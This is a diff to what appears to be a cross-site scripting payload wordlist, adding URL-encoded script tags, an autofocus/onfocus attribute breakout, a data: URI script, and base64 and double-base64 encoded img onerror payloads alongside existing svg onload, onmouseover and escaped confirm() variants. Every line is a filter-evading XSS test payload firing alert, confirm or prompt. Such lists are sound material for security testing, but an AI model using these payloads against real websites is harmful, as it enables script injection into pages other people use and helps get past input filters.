@@ -4,6 +4,7 @@ alert(1)
 javascript:alert(1)
 <img src=1 onerror=alert(1)>
 %5c%27%3balert(1)%2f%2f
+%3Cscript%3Ealert(1)%3C%2Fscript%3E
 <script>{onerror=alert}throw 1</script>
 "><svg onload=alert()>
 "><svg onload=alert()><b attr="
@@ -18,6 +19,7 @@ javascript:alert(1)
 " onmouseover="alert(1)"
 'onmouseover='alert(1)'
 ' onmouseover='alert(1)'
+"onfocus="alert(1)"autofocus="
 confirm()
 confirm``
 (confirm``)
@@ -46,3 +48,6 @@ co\u006efirm()
 </noscript><script>alert(1)</script>
 " onload="alert(1)"
 ' onload='alert(1)'
+data:text/html,<script>prompt(1)</script>
+PGltZyBzcmM9MSBvbmVycm9yPWFsZXJ0KDEpPg==
+UEdsdFp5QnpjbU05TVNCdmJtVnljbTl5UFdGc1pYSjBLREVwUGc9PQ==
